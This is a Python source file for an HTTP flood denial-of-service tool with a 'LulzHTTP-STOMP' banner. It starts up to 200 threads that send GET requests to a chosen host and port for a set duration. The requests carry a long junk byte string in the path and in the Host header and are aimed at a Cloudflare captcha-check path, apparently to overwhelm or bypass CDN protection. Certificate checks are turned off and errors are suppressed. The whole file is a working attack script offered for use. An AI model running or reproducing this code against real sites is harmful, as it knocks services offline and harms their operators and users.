import threading, sys, os, time, requests, json
from random import choice, randint
from utils import *

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def flood():

    url = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])

    time.sleep(5)

    stoptime = time.time() + duration
    session = createsession()
    while time.time() < stoptime:
        try:
            headers = buildheaders(url)
            kek = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA'
            session.get(f'{"https" if port == 443 else "http"}://{url}:{str(port)}/{kek}', headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
            headers['host'] = kek
            session.get(f'{"https" if port == 443 else "http"}://{url}:{str(port)}/cdn-cgi/l/chk_captcha', headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$          /$$$$$$  /$$$$$$$$ /$$$$$$  /$$      /$$ /$$$$$$$ 
            | $$                | $$          | $$  | $$|__  $$__/|__  $$__/| $$__  $$        /$$__  $$|__  $$__//$$__  $$| $$$    /$$$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  | $$   | $$      | $$   | $$  \ $$       | $$  \__/   | $$  | $$  \ $$| $$$$  /$$$$| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$$   | $$      | $$   | $$$$$$$//$$$$$$|  $$$$$$    | $$  | $$  | $$| $$ $$/$$ $$| $$$$$$$/
            | $$      | $$  | $$| $$   /$$$$/ | $$__  $$   | $$      | $$   | $$____/|______/ \____  $$   | $$  | $$  | $$| $$  $$$| $$| $$____/ 
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$   | $$      | $$   | $$              /$$  \ $$   | $$  | $$  | $$| $$\  $ | $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$  | $$   | $$      | $$   | $$             |  $$$$$$/   | $$  |  $$$$$$/| $$ \/  | $$| $$      
            |________/ \______/ |__/|________/|__/  |__/   |__/      |__/   |__/              \______/    |__/   \______/ |__/     |__/|__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')